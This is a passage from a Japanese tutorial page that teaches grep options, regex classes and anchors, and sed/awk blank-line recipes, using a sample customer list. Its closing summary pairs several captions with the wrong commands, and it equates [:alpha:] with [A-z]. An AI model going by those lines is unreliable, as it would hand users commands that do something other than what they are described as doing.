$ cat Customers.txt | grep -v 'Abir'
ID  Name            Email           Phone
23  Riya Chakroborti    riya@gmail.com      +8801937864534
45  Minhaz Ali      ali@gmail.com       +8801190761212
56  Maliha Chowdhury    maliha@gmail.com        +8801820001980
79  Maruf Sarkar        maruf@gmail.com     +8801670908966
$
</pre>
<div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>-vオプションは、ファイルから一致しない文字列を検索するために使用されます。</dd>
<dd></dd>
<dd>検索文字列を除外して検索する場合は、'-v&rsquo;オプションを使います。<br>
$ cat &lt;ファイル名> | grep -v &ldquo;検索文字列&rdquo;</dd>
</dl>
</div>
<h3 id=大文字と小文字を区別しない一致の検索文字列>大文字と小文字を区別しない一致の検索文字列</h3>
<p><code>grep</code>コマンドは、デフォルトで大文字と小文字を区別してファイルから文字列を検索します。<br>
<code>grep</code>コマンドの -i オプションは、大文字と小文字を区別しない方法でファイルから文字列を検索するために使用されます。<br>
この例では、-i オプションを指定した <code>grep</code> コマンドを使用して、前に作成したCustomers.txtファイルから大文字と小文字を区別しない方法で特定の文字列を検索しています。</p>
<pre>
$ cat Customers.txt
ID  Name            Email           Phone
11  Md. Abir        abir@gmail.com      +8801813462458
23  Riya Chakroborti    riya@gmail.com      +8801937864534
45  Minhaz Ali      ali@gmail.com       +8801190761212
56  Maliha Chowdhury    maliha@gmail.com        +8801820001980
79  Maruf Sarkar        maruf@gmail.com     +8801670908966
$
$ cat Customers.txt | grep -i 'minhaz'
45  <font color=red>Minhaz</font> Ali      ali@gmail.com       +8801190761212
$
</pre>
<div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>文字が大文字または小文字の文字列を含む1つ以上の行がファイルに存在する場合、その行が出力されます。</dd>
<dd>大文字小文字を区別しないで検索する場合は、'-i&rsquo;オプションを使います。<br>
$ cat &lt;ファイル名> | grep -i &ldquo;検索文字列&rdquo;</dd>
</dl>
</div>
<h3 id=単語全体のみを検索>単語全体のみを検索</h3>
<p><code>grep</code>コマンドの &lsquo;-w&rsquo; オプションは、大文字と小文字を区別してファイルから単語全体を検索するために使用されます。<br>
この例では、'-w&rsquo; オプションを指定した<code>grep</code>コマンドを使用して、最初の例で作成されたCustomers.txtファイルから単語全体を検索しています。</p>
<p>次のコマンドは、customers.txtファイルの内容を表示します。</p>
<pre tabindex=0><code>$ cat Customers.txt
ID  Name            Email           Phone
11  Md. Abir        abir@gmail.com      +8801813462458
23  Riya Chakroborti    riya@gmail.com      +8801937864534
45  Minhaz Ali      ali@gmail.com       +8801190761212
56  Maliha Chowdhury    maliha@gmail.com        +8801820001980
79  Maruf Sarkar        maruf@gmail.com     +8801670908966
$
</code></pre><p>次の<code>grep</code>コマンドは、文字列「Ma」を含むテキストファイルの行を検索します。ファイルのいずれかの行に文字列「Ma」が含まれている場合、その行が出力されます。</p>
<pre>
$ cat Customers.txt | grep 'Ma'
56  <font color=red>Ma</font>liha Chowdhury    maliha@gmail.com        +8801820001980
79  <font color=red>Ma</font>ruf Sarkar        maruf@gmail.com     +8801670908966
$
</pre>
<p>次の<code>grep</code>コマンドは、「Ma」という単語を含むテキストファイルの行を出力します。<br>
<code>-w</code>オプションを付けることで、ファイルのいずれかの行に「Ma」という単語がある場合、その行が出力されます。<br>
以下の例では、「Ma」という単語がないため、出力されません。</p>
<pre tabindex=0><code>$ cat Customers.txt | grep -w 'Ma'
$ 
</code></pre><p>次の<code>grep</code>コマンドは、「Maliha」という単語を含むテキストファイルの行を正確に検索します。<br>
ファイルのいずれかの行に「Maliha」という単語が正確に含まれている場合、その行が出力されます。</p>
<pre>
$ cat Customers.txt | grep -w 'Maliha'
56  <font color=red>Maliha</font> Chowdhury    maliha@gmail.com        +8801820001980
$
</pre>
<div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>-w オプションと検索語「Ma」を指定した<code>grep</code>コマンドは、テキストファイルに「Ma」という単語がないため、何も返しませんでした。</dd>
<dd>-w オプションと検索語「Maliha」を指定した<code>grep</code>コマンドは、「Maliha」という単語を含むファイルの5行目を返しました。</dd>
<dd>-w オプションは正確な単語を検索対象とするオプションです。</dd>
<dd>
<p>-w オプションは、「含む」のではなく、合致するかどうかを判定するためのオプションとなります。</p>
</dd>
</dl>
</div>
<h3 id=現在のディレクトリで複数のファイルを検索する>現在のディレクトリで複数のファイルを検索する</h3>
<p><code>grep</code>コマンドは、ファイル内の特定のコンテンツを検索し、検索文字列またはパターンに基づいて現在のディレクトリ内の複数のファイルを検索するために使用されます。<br>
<code>*</code> ワイルドカードは、現在のディレクトリ内にある複数のファイルを検索対象とする方法です。</p>
<p>次の<code>grep</code>コマンドは、現在のディレクトリのファイルを再帰的に「split」という単語を含む語句を検索します。</p>
<pre tabindex=0><code>$ grep -w split *
$ 
</code></pre><h3 id=ディレクトリを再帰的に検索する>ディレクトリを再帰的に検索する</h3>
<p>&lsquo;-r&rsquo; オプションは、<code>grep</code>コマンドとともに使用して、ディレクトリ内にあるサブディレクトリ内の特定の文字列またはパターンを再帰的に検索します。<br>
この例では、<code>grep</code>コマンドを使用して現在のディレクトリを再帰的に検索し、Customers.txtファイルを検索します。</p>
<pre tabindex=0><code>$ grep -wr split *
$ 
</code></pre><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>ディレクトリを指定して再帰的に検索したい場合は、</dd>
<dd>$ grep -r 検索文字列 検索したい場所となります。</dd>
<dd>以下の例では、/etc/services のディレクトリ内を再帰的に、kpasswd という語句に合致する行を含むファイルを出力します。</dd>
</dl>
<pre>
$ grep -wr kpasswd /etc/services
/etc/services :56 <font color=red>kpasswd</font>         464/udp     # kpasswd
/etc/services :56 <font color=red>kpasswd</font>         464/tcp     # kpasswd
$
</pre>
</div>
<h3 id=行番号を出力に追加します>行番号を出力に追加します</h3>
<p><code>grep</code>コマンドの &lsquo;-n&rsquo; オプションは、ファイルの行番号とともに検索文字列の出力を出力するために使用されます。<br>
この例では、'-n' オプションを指定した<code>grep</code>コマンドを使用して、最初の例で作成されたCustomers.txtファイルの行番号を含む検索出力を表示しています。</p>
<pre>
$ cat Customers.txt
ID  Name            Email           Phone
11  Md. Abir        abir@gmail.com      +8801813462458
23  Riya Chakroborti    riya@gmail.com      +8801937864534
45  Minhaz Ali      ali@gmail.com       +8801190761212
56  Maliha Chowdhury    maliha@gmail.com        +8801820001980
79  Maruf Sarkar        maruf@gmail.com     +8801670908966
$
$ cat Customers.txt | grep -n "Ali"
4:45  Minhaz <font color=red>Ali</font>      ali@gmail.com       +8801190761212
$
</pre>
<h3 id=一致する行の後に特定の行数を出力します>一致する行の後に特定の行数を出力します</h3>
<p>数値を含む &lsquo;-A&rsquo; オプションは、ファイル内で見つかった一致する文字列またはパターンの後に特定の行数を出力するために使用されます。<br>
この例では、Customers.txtファイルに対して<code>grep</code>コマンドの &lsquo;-A&rsquo; オプションを使用しています。</p>
<pre>
$ cat Customers.txt
ID  Name            Email           Phone
11  Md. Abir        abir@gmail.com      +8801813462458
23  Riya Chakroborti    riya@gmail.com      +8801937864534
45  Minhaz Ali      ali@gmail.com       +8801190761212
56  Maliha Chowdhury    maliha@gmail.com        +8801820001980
79  Maruf Sarkar        maruf@gmail.com     +8801670908966
$
$ cat Customers.txt | grep -A2 "Ali"
45  Minhaz <font color=red>Ali</font>      ali@gmail.com       +8801190761212
56  Maliha Chowdhury    maliha@gmail.com        +8801820001980
79  Maruf Sarkar        maruf@gmail.com     +8801670908966
$
</pre>
<h3 id=一致する行の前に特定の行数を出力します>一致する行の前に特定の行数を出力します</h3>
<p>数値を含む &lsquo;-B&rsquo; オプションは、ファイル内で一致する文字列またはパターンの前に特定の行数を出力するために使用されます。<br>
この例では、Customers.txtファイルに対して<code>grep</code>コマンドの &lsquo;-B&rsquo; オプションの使用法を示しています。</p>
<pre>
$ cat Customers.txt
ID  Name            Email           Phone
11  Md. Abir        abir@gmail.com      +8801813462458
23  Riya Chakroborti    riya@gmail.com      +8801937864534
45  Minhaz Ali      ali@gmail.com       +8801190761212
56  Maliha Chowdhury    maliha@gmail.com        +8801820001980
79  Maruf Sarkar        maruf@gmail.com     +8801670908966
$
$ cat Customers.txt | grep -B1 "Riya"
11  Md. Abir        abir@gmail.com      +8801813462458
23  <font color=red>Riya</font> Chakroborti    riya@gmail.com      +8801937864534
$
</pre>
<h3 id=一致する行の前後の特定の行数を出力>一致する行の前後の特定の行数を出力</h3>
<p>数値を指定した &lsquo;-C&rsquo; オプションは、ファイル内で見つかった一致する文字列またはパターンの前後の特定の行数を出力するために使用されます。<br>
この例では、 Customers.txtファイルの<code>grep</code>コマンドの &lsquo;-C&rsquo; オプションの使用法を示しています。</p>
<pre>
$ cat Customers.txt
ID  Name            Email           Phone
11  Md. Abir        abir@gmail.com      +8801813462458
23  Riya Chakroborti    riya@gmail.com      +8801937864534
45  Minhaz Ali      ali@gmail.com       +8801190761212
56  Maliha Chowdhury    maliha@gmail.com        +8801820001980
79  Maruf Sarkar        maruf@gmail.com     +8801670908966
$
$ cat Customers.txt | grep -C1 "Maliha"
45  Minhaz Ali      ali@gmail.com       +8801190761212
56  <font color=red>Maliha</font> Chowdhury    maliha@gmail.com        +8801820001980
79  Maruf Sarkar        maruf@gmail.com     +8801670908966
$
</pre>
<div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>ターミナルから前のコマンドを実行すると、次の出力が表示されます。5行目には、文字列 &lsquo;Maliha&rsquo;が含まれています。4行目は一致する行の前の行で、6行目は一致する行の次の行です。したがって、4行目、5行目、および6行目は、一致する文字列を強調表示することによって出力に出力されています。</dd>
</dl>
</div>
<h3 id=ブラケットを使用して特定の数字を一致させる>ブラケットを使用して特定の数字を一致させる[]</h3>
<p>特定の桁の範囲は、角かっこ[]を使用して、<code>grep</code>コマンドの正規表現パターンで定義できます。<br>
この例では、Customers.txtファイルの<code>grep</code>コマンドを使用して特定の数字を検索する方法を示します。</p>
<pre>
$ cat Customers.txt
ID  Name            Email           Phone
11  Md. Abir        abir@gmail.com      +8801813462458
23  Riya Chakroborti    riya@gmail.com      +8801937864534
45  Minhaz Ali      ali@gmail.com       +8801190761212
56  Maliha Chowdhury    maliha@gmail.com        +8801820001980
79  Maruf Sarkar        maruf@gmail.com     +8801670908966
$ cat Customers.txt | grep '[3-5]'
$
11  Md. Abir        abir@gmail.com      +880181<font color=red>34</font>62<font color=red>45</font>8
2<font color=red>3</font>  Riya Chakroborti    riya@gmail.com      +88019<font color=red>3</font>786<font color=red>4534</font>
<font color=red>45</font>  Minhaz Ali      ali@gmail.com       +8801190761212
<font color=red>5</font>6  Maliha Chowdhury    maliha@gmail.com        +8801820001980
$
</pre>
<div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>[3-5] は、3,4,5 のいずれかを検索文字列とするという意味となります。</dd>
<dd>2,3,4,5,6 としたい場合は、 [2-6]となります。</dd>
</dl>
</div>
<h3 id=3番目のブラケットを使用してパターンを特定の文字と一致させる>3番目のブラケットを使用してパターンを特定の文字と一致させる[]</h3>
<p>ファイルの特定の文字は、角かっこ[]を使用してさまざまな方法で一致させることができます。<br>
角かっこを使用してファイルから特定の行を検索することにより、正規表現パターンで文字の範囲または特定の文字を使用できます。<br>
この例では、文字範囲または特定の文字のパターンを使用して、Customers.txtファイル内の特定の文字を検索する方法を示します。</p>
<pre>
$ cat Customers.txt
ID  Name            Email           Phone
11  Md. Abir        abir@gmail.com      +8801813462458
23  Riya Chakroborti    riya@gmail.com      +8801937864534
45  Minhaz Ali      ali@gmail.com       +8801190761212
56  Maliha Chowdhury    maliha@gmail.com        +8801820001980
79  Maruf Sarkar        maruf@gmail.com     +8801670908966
$
$ cat Customers.txt | grep 'Ma[lr]'
56  <font color=red>Mal</font>iha Chowdhury    maliha@gmail.com        +8801820001980
79  <font color=red>Mar</font>uf Sarkar        maruf@gmail.com     +8801670908966
$
</pre>
<div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>Ma から始まる単語を検索し、さらに続く文字列が &lsquo;[lr]&rsquo; すなわち、l または r である文字列を検索します。いわゆる「Mal」と「Mar」を検索するという意味になります。</dd>
</dl>
</div>
<h3 id=alnumクラスを使用してアルファベットと数字を一致させる>[：alnum：]クラスを使用してアルファベットと数字を一致させる</h3>
<p>[:alnum:]クラスは、アルファベットと数字を照合するために正規表現パターンで使用されます。<br>
パターン[A-z0-9]に相当します。</p>
<h3 id=alphaクラスを使用してアルファベット文字を照合する>[：alpha：]クラスを使用してアルファベット文字を照合する</h3>
<p>[:alpha:]クラスは、アルファベット文字のみに一致する正規表現パターンで使用されます。<br>
パターン[A-z]に相当します。</p>
<h3 id=digitクラスを使用して数字を照合する>[：digit：]クラスを使用して数字を照合する</h3>
<p>[:digit:]クラスは、正規表現パターンで数字のみに一致するために使用されます。<br>
パターン[0-9]と同等です。</p>
<h3 id=lowerクラスを使用して小文字を照合する>[：lower：]クラスを使用して小文字を照合する</h3>
<p>[:lower:]クラスは、すべての小文字のみに一致するように正規表現パターンで使用されます。<br>
パターン[a-z]と同等です。</p>
<h3 id=spaceクラスを使用してスペース文字を一致させる>[：space：]クラスを使用してスペース文字を一致させる</h3>
<p>[:space:]クラスは、スペース文字を含む行と一致させるために正規表現パターンで使用されます。</p>
<div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>$ grep &ldquo;test(タブ文字)&rdquo; /path/to/file<br>
:と、入力したい場合は、ctrl-v を入力してからタブを打つと入力される。</dd>
<dd>
<p>&lsquo;[[:space:]]&rsquo; では空白文字もタブ文字もマッチする。</p>
</dd>
<dd>これならメモなどからコピペできる。<br>
$ grep &ldquo;test[[:space:]]&rdquo; /path/to/file</dd>
<dd>
<p>また、<br>
$ grep test$'\t&rsquo; /path/to/file<br>
であればタブだけがマッチする。</p>
</dd>
</dl>
</div>
<h3 id=行頭からの検索>行頭からの検索</h3>
<p>キャレット <code>^</code> 記号は行頭を表します。<br>
ファイル内の行頭が、特定の文字または文字列で始まる行と一致します。<br>
この記号の使用法は、前に作成されたCustomers.txtファイルのこの例で示されています。</p>
<pre>
$ cat Customers.txt
ID  Name            Email           Phone
11  Md. Abir        abir@gmail.com      +8801813462458
23  Riya Chakroborti    riya@gmail.com      +8801937864534
45  Minhaz Ali      ali@gmail.com       +8801190761212
56  Maliha Chowdhury    maliha@gmail.com        +8801820001980
79  Maruf Sarkar        maruf@gmail.com     +8801670908966
$
$ cat Customers.txt | grep ^4
<font color=red>4</font>5  Minhaz Ali      ali@gmail.com       +8801190761212
$

</pre>
<div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>ターミナルから前のコマンドを実行すると、customers.txtファイルには「 4 」で始まる行が1行だけ存在します。これは、出力に出力されたファイルの4行目です。</dd>
</dl>
</div>
<h3 id=行の終わりに一致する>行の終わりに一致する</h3>
<p>ドル <code>$</code> 記号は、ファイル内の特定の文字または文字列の行末を一致させるための正規表現です。<br>
この記号の使用法は、前に作成されたCustomers.txtファイルのこの例で示されています。</p>
<pre>
$ cat Customers.txt
ID  Name            Email           Phone
11  Md. Abir        abir@gmail.com      +8801813462458
23  Riya Chakroborti    riya@gmail.com      +8801937864534
45  Minhaz Ali      ali@gmail.com       +8801190761212
56  Maliha Chowdhury    maliha@gmail.com        +8801820001980
79  Maruf Sarkar        maruf@gmail.com     +8801670908966
$
$ cat Customers.txt | grep 1212$
45  Minhaz Ali      ali@gmail.com       +8801190761212
$
</pre>
<div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>customers.txtファイルには「1212」で終わる行が1行だけ存在します。</dd>
</dl>
</div>
<h3 id=連結との一致>連結との一致</h3>
<p>正規表現パターンは、複数のパターンを連結することで作成できます。<br>
ドット <code>.</code> は、パターンを連結するために使用されます。<br>
この例では、 Customers.txtファイルに対して<code>grep</code>コマンドと連結して使用する方法を示しています。</p>
<pre>
$ cat Customers.txt
ID  Name            Email           Phone
11  Md. Abir        abir@gmail.com      +8801813462458
23  Riya Chakroborti    riya@gmail.com      +8801937864534
45  Minhaz Ali      ali@gmail.com       +8801190761212
56  Maliha Chowdhury    maliha@gmail.com        +8801820001980
79  Maruf Sarkar        maruf@gmail.com     +8801670908966
$
$ cat Customers.txt | grep -e '[MR].*[Kk]'
23  <font color=red>Riya Chak</font>roborti    riya@gmail.com      +8801937864534
79  <font color=red>Maruf Sark</font>ar        maruf@gmail.com     +8801670908966
$
</pre>
<div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>customers.txtファイルには「M」または「R」で始まり「K」または「k」で終わる2行が存在します。したがって、ファイルの3行目と6行目が出力に出力されています。</dd>
</dl>
</div>
<h2 id=awk-のtips>awk のTIPS</h2>
<h3 id=タブを列セパレータとして設定>タブを列セパレータとして設定</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>awk -F <span class=s1>$&#39;\t&#39;</span> 
</code></pre></div><h3 id=タブ区切りとして出力-列区切りとしても>タブ区切りとして出力 (列区切りとしても)</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>awk -v <span class=nv>OFS</span><span class=o>=</span><span class=s1>&#39;\t&#39;</span>
</code></pre></div><h3 id=変数を渡す>変数を渡す</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=nv>a</span><span class=o>=</span>bbo<span class=p>;</span><span class=nv>b</span><span class=o>=</span>obb<span class=p>;</span>
awk -v <span class=nv>a</span><span class=o>=</span><span class=s2>&#34;</span><span class=nv>$a</span><span class=s2>&#34;</span> -v <span class=nv>b</span><span class=o>=</span><span class=s2>&#34;</span><span class=nv>$b</span><span class=s2>&#34;</span> <span class=s2>&#34;</span><span class=nv>$1</span><span class=s2>==a &amp;&amp; </span><span class=nv>$10</span><span class=s2>=b&#34;</span> filename
</code></pre></div><h2 id=sed-のtips>sed のTIPS</h2>
<h3 id=sed連結>sed連結</h3>
<p>次のようなかなり長いコマンドは、</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>sed -e <span class=s1>&#39;/AAA/b&#39;</span> -e <span class=s1>&#39;/BBB/b&#39;</span> -e <span class=s1>&#39;/CCC/b&#39;</span> -e d
</code></pre></div><p>GNU sed を使用すると、次のように書くことができます。</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>sed <span class=s1>&#39;/AAA/b;/BBB/b;/CCC/b;d&#39;</span>
sed <span class=s1>&#39;/AAA\|BBB\|CCC/b;d&#39;</span>
</code></pre></div><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>sed -e &lsquo;/AAA/b&rsquo; -e &lsquo;/BBB/b&rsquo; -e &lsquo;/CCC/b&rsquo; -e d</dd>
<dd>を</dd>
<dd>sed &lsquo;/AAA/b;/BBB/b;/CCC/b;d&rsquo;</dd>
<dd>書くことでソースが簡潔で見やすくなりますので、是非身につけておきたいものです。</dd>
</dl>
</div>
<h3 id=sedの速度最適化>sedの速度最適化</h3>
<p>実行速度を上げる必要がある場合 (入力ファイルが大きい、プロセッサやハードディスクが遅いなどの理由で)、「s/…/…/」を指定する前に「find」式を指定すると、置換がより迅速に実行されます。</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>sed <span class=s1>&#39;s/foo/bar/g&#39;</span> filename         <span class=c1># 通常の書き方</span>
sed <span class=s1>&#39;/foo/ s/foo/bar/g&#39;</span> filename   <span class=c1># ちょっと早い</span>
sed <span class=s1>&#39;/foo/ s//bar/g&#39;</span> filename      <span class=c1># かなり高速</span>
</code></pre></div><p>ファイルの最初の部分から行を出力するだけでよい行の選択または削除では、スクリプト内の「quit」コマンド (q) により、大きなファイルの処理時間が大幅に短縮されます。</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>sed -n <span class=s1>&#39;45,50p&#39;</span> filename           <span class=c1># print line nos. 45-50 of a file</span>
sed -n <span class=s1>&#39;51q;45,50p&#39;</span> filename       <span class=c1># same, but executes much faster</span>
</code></pre></div><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd><code>sed</code> での高速化は最初にfindすることがコツです。</dd>
<dd>sed &rsquo;s/foo/bar/g' filename # 通常の書き方</dd>
<dd>sed &lsquo;/foo/ s/foo/bar/g&rsquo; filename # ちょっと早い</dd>
<dd>sed &lsquo;/foo/ s//bar/g&rsquo; filename # かなり高速</dd>
</dl>
</div>
<h2 id=空白行や改行の扱い>空白行や改行の扱い</h2>
<h3 id=sed-行末を行末改行に置き換えます>sed 行末を行末＋改行に置き換えます。</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:blankText.txt data-lang=:blankText.txt>Hello,

world!
</code></pre></div><pre tabindex=0><code>bash-3.2$ cat blankText.txt
Hello,

world!
bash-3.2$ cat blankText.txt | sed G
Hello,



world!

bash-3.2$
</code></pre><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>G オプションは、各行の下に空行を挿入します。</dd>
</dl>
</div>
<h3 id=awk-行末を行末改行に置き換えます>awk 行末を行末＋改行に置き換えます。</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:blankText.txt data-lang=:blankText.txt>Hello,

world!
</code></pre></div><pre tabindex=0><code>bash-3.2$ cat blankText.txt
Hello,

world!
bash-3.2$ cat blankText.txt | awk '1;{print &quot;&quot;}'
Hello,



world!

bash-3.2$
</code></pre><h3 id=awk-行末を行末改行に置き換えます-1>awk 行末を行末＋改行に置き換えます。</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:blankText.txt data-lang=:blankText.txt>Hello,

world!
</code></pre></div><pre tabindex=0><code>bash-3.2$ cat blankText.txt
Hello,

world!
bash-3.2$ cat blankText.txt | awk 'BEGIN{ORS=&quot;\n\n&quot;};1'
Hello,



world!

bash-3.2$
</code></pre><h3 id=sed-行末を行末改行ｘ２に置き換えます>sed 行末を（行末＋改行）ｘ２に置き換えます</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:spaceText.txt data-lang=:spaceText.txt>Hello,world!
Hello,world!
Hello,world!
Hello,world!
</code></pre></div><pre tabindex=0><code>bash-3.2$ cat spaceText.txt
Hello,world!
Hello,world!
Hello,world!
Hello,world!
bash-3.2$ cat spaceText.txt | sed 'G;G'
Hello,world!


Hello,world!


Hello,world!


Hello,world!


bash-3.2$
</code></pre><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>&lsquo;G;G&rsquo; オプションは、各行の下に空行＋空行を挿入します。</dd>
</dl>
</div>
<h3 id=awk-行末を行末改行ｘ２に置き換えます>awk 行末を（行末＋改行）ｘ２に置き換えます</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:spaceText.txt data-lang=:spaceText.txt>Hello,world!
Hello,world!
Hello,world!
Hello,world!
</code></pre></div><pre tabindex=0><code>bash-3.2$ cat spaceText.txt
Hello,world!
Hello,world!
Hello,world!
Hello,world!
bash-3.2$ cat spaceText.txt | awk '1;{print &quot;\n&quot;}'
Hello,world!


Hello,world!


Hello,world!


Hello,world!


bash-3.2$
</code></pre><h3 id=sed-１行おきに空白行を挿入します>sed １行おきに空白行を挿入します</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:spaceText.txt data-lang=:spaceText.txt>Hello,world!
Hello,world!
Hello,world!
Hello,world!
</code></pre></div><pre tabindex=0><code>bash-3.2$ cat spaceText.txt
Hello,world!
Hello,world!
Hello,world!
Hello,world!
bash-3.2$ cat spaceText.txt | sed '/^$/d;G'
Hello,world!

Hello,world!

Hello,world!

Hello,world!

bash-3.2$
</code></pre><h3 id=awk-列数を出力>awk 列数を出力</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>awk <span class=s1>&#39;{print NF}&#39;</span>
</code></pre></div><p>参考：NF（列数）</p>
<pre tabindex=0><code>bash-3.2$ cat calc02.txt
10  11	1
12  13	1
14  15	1
16  17	1
18  19	1
20  21	1
bash-3.2$ cat calc02.txt | awk '{ print NF }'
3
3
3
3
3
3
bash-3.2$
</code></pre><h3 id=awk-１行おきに空白行を挿入します>awk １行おきに空白行を挿入します。</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:spaceText.txt data-lang=:spaceText.txt>Hello,world!
Hello,world!
Hello,world!
Hello,world!
</code></pre></div><pre tabindex=0><code>bash-3.2$ cat spaceText.txt
Hello,world!
Hello,world!
Hello,world!
Hello,world!
bash-3.2$ cat spaceText.txt | awk 'NF{print $0 &quot;\n&quot;}'
Hello,world!

Hello,world!

Hello,world!

Hello,world!

bash-3.2$
</code></pre><h3 id=sed-偶数行の空白行を削除します>sed 偶数行の空白行を削除します</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:doubleSpace.txt data-lang=:doubleSpace.txt>bash-3.2$ cat doubleSpace.txt
Hello,world!

Hello,world!

Hello,world!

Hello,world!

bash-3.2$
</code></pre></div><pre tabindex=0><code>bash-3.2$ cat doubleSpace.txt
Hello,world!

Hello,world!

Hello,world!

Hello,world!

bash-3.2$ cat doubleSpace.txt | sed 'n;d'
Hello,world!
Hello,world!
Hello,world!
Hello,world!
bash-3.2$
</code></pre><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>&lsquo;n;d&rsquo; オプションは １行おきに削除するという意味です。</dd>
</dl>
</div>
<h3 id=sed-パターンに一致するすべての行の上に空白行を挿入>sed パターンに一致するすべての行の上に空白行を挿入</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:regex01.txt data-lang=:regex01.txt>Hello,Japan!
Hello,America!
Hello,France!
Hello,China!
</code></pre></div><pre tabindex=0><code>bash-3.2$ cat regex01.txt
Hello,Japan!
Hello,America!
Hello,France!
Hello,China!
bash-3.2$ cat regex01.txt | sed '/America/{x;p;x;}'
Hello,Japan!

Hello,America!
Hello,France!
Hello,China!
bash-3.2$
</code></pre><h3 id=sed-パターンに一致するすべての行の下に空白行を挿入>sed パターンに一致するすべての行の下に空白行を挿入</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:regex01.txt data-lang=:regex01.txt>Hello,Japan!
Hello,America!
Hello,France!
Hello,China!
</code></pre></div><pre tabindex=0><code>bash-3.2$ cat regex01.txt
Hello,Japan!
Hello,America!
Hello,France!
Hello,China!
bash-3.2$ cat regex01.txt | sed '/America/G'
Hello,Japan!
Hello,America!

Hello,France!
Hello,China!
bash-3.2$
</code></pre><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd>&lsquo;G&rsquo; オプションは、パターンにマッチした行の下に空業を挿入します。</dd>
</dl>
</div>
<h3 id=sed-パターンに一致するすべての行の上下に空白行を挿入>sed パターンに一致するすべての行の上下に空白行を挿入</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:regex01.txt data-lang=:regex01.txt>Hello,Japan!
Hello,America!
Hello,France!
Hello,China!
</code></pre></div><pre tabindex=0><code>bash-3.2$ cat regex01.txt
Hello,Japan!
Hello,America!
Hello,France!
Hello,China!
bash-3.2$ cat regex01.txt | sed '/America/{x;p;x;G;}'
Hello,Japan!

Hello,America!

Hello,France!
Hello,China!
bash-3.2$
</code></pre><h3 id=sed-ファイルの末尾に空白行を追記>sed ファイルの末尾に空白行を追記</h3>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-:regex01.txt data-lang=:regex01.txt>Hello,Japan!
Hello,America!
Hello,France!
Hello,China!
</code></pre></div><pre tabindex=0><code>bash-3.2$ cat regex01.txt
Hello,Japan!
Hello,America!
Hello,France!
Hello,China!
bash-3.2$ cat regex01.txt | sed '$a \\'
Hello,Japan!
Hello,America!
Hello,France!
Hello,China!

bash-3.2$
</code></pre><div class="tips-area tips">
<dl>
<dt>ヒント</dt>
<dd><code>$a</code> は最下行を意味します。また <code>\\</code> は <code>\</code> をエスケープ <code>\</code> します。</dd>
</dl>
</div>
<h3 id=sed-awk-空白行の操作>sed awk 空白行の操作</h3>
<p>空行１行を空行２行に増やす</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>sed G
awk <span class=s1>&#39;1;{print &#34;&#34;}&#39;</span>
awk <span class=s1>&#39;BEGIN{ORS=&#34;\n\n&#34;};1&#39;</span>
</code></pre></div><p>空行１行を空行３行に増やす</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>sed <span class=s1>&#39;/^$/d;G&#39;</span>
awk <span class=s1>&#39;NF{print $0 &#34;\n&#34;}&#39;</span>
</code></pre></div><p>空行２行を空行１行に減らす</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>sed <span class=s1>&#39;G;G&#39;</span>
awk <span class=s1>&#39;1;{print &#34;\n&#34;}&#39;</span>
</code></pre></div><p>パターンに一致するすべての行の上に空白行を挿入</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>sed <span class=s1>&#39;n;d&#39;</span>
</code></pre></div><p>正規表現に一致するすべての行の下に空白行を挿入</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>sed <span class=s1>&#39;/regex/{x;p;x;}&#39;</span>
</code></pre></div><p>正規表現に一致するすべての行の上下に空白行を挿入</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>sed <span class=s1>&#39;/regex/G&#39;</span>
</code></pre></div><p>末尾に改行を追加します:</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>sed <span class=s1>&#39;/regex/{x;p;x;G;}&#39;</span>
sed <span class=s1>&#39;$a\&#39;</span>
</code></pre></div><h2 id=ファイルへの文字列の追加>ファイルへの文字列の追加</h2>
<h3 id=sed-ファイルの末尾に文字列を追加>sed ファイルの末尾に文字列を追加</h3>
